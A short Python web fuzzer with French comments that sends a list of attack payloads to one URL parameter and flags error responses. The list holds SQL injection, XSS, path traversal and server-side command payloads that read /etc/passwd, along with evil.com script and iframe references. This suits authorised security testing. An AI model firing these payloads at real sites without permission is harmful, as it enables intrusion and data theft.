import requests

class Fuzzer:
    def __init__(self, target_url, parameter):
        self.target_url = target_url
        self.parameter = parameter

    def simple_fuzz(self):
        # Listes de valeurs à utiliser pour le fuzzing
        payloads = [
            "'", "<script>alert('XSS')</script>",
            "|", "&", "$", ";", "%00", "<>", "><", "{}", "''''''", "%%%%%%%%%%%",
            "/etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
            "1' or '1'='1", "1' or '1'='1'--", "admin'--", "admin' #", "admin') --",
            "<svg onload=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
            "<?php echo 'XSS'; ?>", "<?php system('ls'); ?>",
            "<!--#exec cmd='ls'-->", "<!--#exec cmd='/bin/cat /etc/passwd'-->",
            "http://evil.com/malicious.js", "<iframe src='http://evil.com'></iframe>",
            # Ajoutez d'autres payloads en fonction de ce que vous voulez tester
        ]
        fuzz_found = False
        for payload in payloads:
            # Envoi de la requête avec le payload injecté
            params = {self.parameter: payload}
            response = requests.get(self.target_url, params=params)

            # Vérification de la réponse pour détecter des signes de vulnérabilités
            if 'Error' in response.text or 'Internal Server Error' in response.text:
                fuzz_found = True
                # res = f"Possible vulnerability found with payload: {payload}"
                return "Possible vulnerability found"

        if not fuzz_found:
            return "No vulnerability found"